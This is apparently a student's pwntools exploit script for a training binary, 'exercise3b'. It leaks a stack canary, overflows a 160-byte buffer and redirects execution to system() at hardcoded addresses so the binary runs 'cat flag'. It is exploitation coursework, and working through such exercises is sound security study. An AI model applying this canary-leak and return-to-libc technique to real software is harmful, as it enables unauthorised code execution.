#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
exploit = b""
# Fill the buffer 160
message = b""
message += b"cat flag"
r.recvline()
r.sendline(message)
exploit += b"A" * 159
info = r.recvline()
#print(info)
r.sendline(exploit)
# Fill the alliance
r.recvline()
r.recvline()
r.recvline()
r.recvline()
canary = r.recvline()
canary = canary[:4]
# print(canary)
exploit = b""
exploit += b"A" * 160
exploit += canary
exploit += b"B" * 20
# System arress = 2a8be830
# argument address = 0804c060
# exit address = 08049140
exploit += bytearray.fromhex("30e88b2a00000000")
#exploit += bytearray.fromhex("3018e1f7")
exploit += bytearray.fromhex("60c0040800000000")
#exploit += bytearray.fromhex("4091040800000000")

#exploit += bytearray.fromhex("60c00408")

r.sendline(exploit)
re = r.recvall()

results = re.splitlines()
result = results[-1]
print(result)
# r.recvline()
# r.recvline()
# r.recvline()
# result = r.recvline()
# print(result)

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
